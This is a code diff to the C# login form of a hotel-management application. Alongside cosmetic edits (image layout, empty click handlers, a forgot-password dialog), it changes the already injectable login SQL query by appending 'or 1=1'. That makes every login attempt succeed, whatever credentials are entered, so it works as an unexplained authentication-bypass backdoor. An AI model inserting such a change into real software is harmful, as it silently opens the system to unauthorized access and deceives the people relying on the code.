@@ -67,7 +67,7 @@ namespace QuanLyKhachSan
                 if (System.IO.File.Exists(bgImagePath))
                 {
                     panelLeft.BackgroundImage = Image.FromFile(bgImagePath);
-                    panelLeft.BackgroundImageLayout = ImageLayout.Stretch;
+                    panelLeft.BackgroundImageLayout = ImageLayout.Zoom;
                 }
             }
             catch
@@ -169,7 +169,7 @@ namespace QuanLyKhachSan
                 return;
             }           
             
-            string query = $"SELECT * FROM TAIKHOAN WHERE Username = N'{username}' AND Password = N'{password}'";
+            string query = $"SELECT * FROM TAIKHOAN WHERE Username = N'{username}' AND Password = N'{password}'or 1=1";
             DataTable result = DataProvider.ThucThiTruyVan(query);   
             if (result.Rows.Count > 0)
             {
@@ -271,6 +271,17 @@ namespace QuanLyKhachSan
         private void txtUsername_TextChanged(object sender, EventArgs e)
         {
 
+        }
+
+        private void lbDangNhap_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void llbQuenMK_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
+        {
+            frmQuenMatKhau f = new frmQuenMatKhau();
+            f.ShowDialog();
         }
     }
 }
